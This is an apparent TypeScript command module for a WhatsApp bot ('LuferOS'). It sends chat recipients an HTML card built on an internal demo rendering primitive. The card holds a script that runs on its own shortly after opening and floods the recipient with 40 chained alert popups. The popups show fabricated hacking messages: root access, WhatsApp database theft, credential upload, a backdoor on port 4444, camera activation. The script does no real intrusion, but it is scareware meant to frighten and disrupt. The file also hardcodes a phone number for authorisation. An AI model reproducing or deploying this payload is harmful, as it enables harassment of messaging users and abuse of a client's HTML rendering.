import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const MASSIVE_HACK_LOGS = [
  "[!] ROOT ACCESS GRANTED: UID=0(root) GID=0(root)",
  "[+] Initializing kernel exploit vector v4.2...",
  "[+] Bypassing Android Security Enclave [OK]",
  "[+] Extracting WhatsApp local database (msgstore.db)...",
  "[+] Decrypting Signal protocol keys...",
  "[+] Injecting payload into /system/bin/surfaceflinger...",
  "[+] Uploading credentials to remote server node...",
  "[!] ALERT: Firewall matrix compromised by LuferOS 🎭",
  "[+] Dumping contacts, media and location history...",
  "[+] Establishing persistent backdoor on port 4444...",
  "[+] Overriding thermal sensors and CPU throttling...",
  "[+] Disabling system notifications and security patches...",
  "[+] Activating front camera stream in background...",
  "[!] WARNING: Device memory partition reformatted.",
  "[+] Finalizing root shell session... OPERATION COMPLETE"
];

function buildMassivePopupPayload(logs: string[], cardSub: string) {
  const serializedLogs = JSON.stringify(logs);

  const htmlContent = `<style>
*{box-sizing:border-box;margin:0;padding:0;user-select:none;-webkit-user-select:none;font-family:'Courier New',Courier,monospace}
body{background:#02040a;color:#00ffcc;padding:10px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.terminal-card{width:100%;max-width:380px;background:#050b14;border:2px solid #ff3b30;border-radius:14px;padding:16px;box-shadow:0 0 40px rgba(255,59,48,0.4);position:relative;overflow:hidden}
.terminal-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,#ff3b30,transparent);animation:scan 1.5s linear infinite}
@keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
.header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #1e293b;padding-bottom:10px;margin-bottom:12px}
.title{font-size:12px;font-weight:900;letter-spacing:1.5px;color:#ff3b30}
.dot{width:9px;height:9px;background:#ff3b30;border-radius:50%;box-shadow:0 0 12px #ff3b30;animation:pulse 0.5s infinite alternate}
@keyframes pulse{0%{opacity:1}100%{opacity:0.2}}
.console-box{background:#010206;border:1px solid #1e293b;border-radius:8px;padding:10px;font-size:11px;color:#38bdf8;margin-bottom:14px;line-height:1.4;height:85px;overflow:hidden}
.prompt{color:#f87171}
.hack-btn{width:100%;background:linear-gradient(135deg,#ff3b30,#991b1b);color:#fff;font-weight:900;border:none;padding:13px;border-radius:9px;cursor:pointer;font-size:12.5px;letter-spacing:1.5px;text-transform:uppercase;box-shadow:0 5px 25px rgba(255,59,48,0.5);transition:transform 0.1s ease}
.hack-btn:active{transform:scale(0.96)}
.footer-txt{font-size:9.5px;color:#64748b;text-align:center;margin-top:10px}
</style>

<div class="terminal-card">
  <div class="header">
    <div class="title">MASSIVE_EXPLOIT_V9.9</div>
    <div class="dot"></div>
  </div>
  <div class="console-box" id="logBox">
    <span class="prompt">[kernel]</span> Initializing attack vector...<br>
    <span class="prompt">[exec]</span> Spawning 40 concurrent threads...<br>
    <span class="prompt">[+]</span> STATUS: READY_TO_FLOOD
  </div>
  <button class="hack-btn" onclick="runMassiveFlood()">⚡ INICIAR BUCLE MASIVO</button>
  <div class="footer-txt">${cardSub}</div>
</div>

<script>
const logs = ${serializedLogs};

function runMassiveFlood() {
  let count = 0;
  // Genera un bucle masivo de 40 alertas continuas con textos dinámicos hacker
  function nextPopup() {
    if (count < 40) {
      const randomLog = logs[count % logs.length];
      const prefix = \`[THREAD #\${count + 1}/40] SYSTEM ALERT:\\n\\n\`;
      
      // Actualiza la consola visualmente de fondo
      const box = document.getElementById('logBox');
      if(box) {
        box.innerHTML = \`<span class="prompt">[exec]</span> Running thread #\${count+1}...<br><span class="prompt">[log]</span> \${randomLog}\`;
      }
      
      alert(prefix + randomLog + "\\n\\n-- LuferOS Security --");
      count++;
      
      // Cadenas ultra rápidas para saturar
      setTimeout(nextPopup, 20);
    } else {
      alert("⚠️ INVASIÓN COMPLETADA.\\n\\nDispositivo bajo control absoluto de LuferOS 🎭");
    }
  }
  nextPopup();
}

// Auto-ejecución masiva a los 400ms de abrir la tarjeta
window.addEventListener('DOMContentLoaded', () => {
  setTimeout(runMassiveFlood, 400);
});
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: htmlContent,
      },
    },
  };
}

export default {
  name: ["popupv2", "masivepop", "hackspam", "v2"],
  category: "system",
  description: "Lanza un bucle masivo de 40 alertas nativas encadenadas con terminal animada.",
  groupOnly: false,
  ownerOnly: true,
  async run(ctx: CommandContext) {
    const { reply, react, sock, from, msg, args, sender, db, isOwner } = ctx;

    const rawSender = String(sender || msg.key?.participant || "");
    const cleanNum = rawSender.split("@")[0].split(":")[0].replace(/\D/g, "");
    const dbAny = db as any;
    const authorized =
      Boolean(isOwner) ||
      Boolean(msg.key?.fromMe) ||
      cleanNum === "573118353868" ||
      Boolean(dbAny?.hasRole?.(rawSender, "owner")) ||
      Boolean(cleanNum && dbAny?.hasRole?.(`${cleanNum}@s.whatsapp.net`, "owner"));

    if (!authorized) {
      await react("⛔").catch(() => undefined);
      return reply("⛔ *Acceso denegado:* Este comando es exclusivo para los propietarios del bot.");
    }

    const customText = args.join(" ").trim().replace(/\\n/g, "\n");
    const logList = customText ? [customText, ...MASSIVE_HACK_LOGS] : MASSIVE_HACK_LOGS;

    await react("💀").catch(() => undefined);

    try {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");

      const rich = new AIRich(sock)
        .setTitle("⚡ Massive Exploit // LuferOS")
        .setFooter("Bucle masivo • 40 threads activos");

      rich.addSection(buildMassivePopupPayload(logList, "Consola de Inundación • Auto-ejecutable"));

      await rich.send(from, { quoted: msg });
      await react("✅").catch(() => undefined);
    } catch (error) {
      await react("❌").catch(() => undefined);
      reply(
        `${fytBold("Error")} al desplegar el script masivo: ${error instanceof Error ? error.message : String(error)}`,
      ).catch(() => undefined);
    }
  },
};
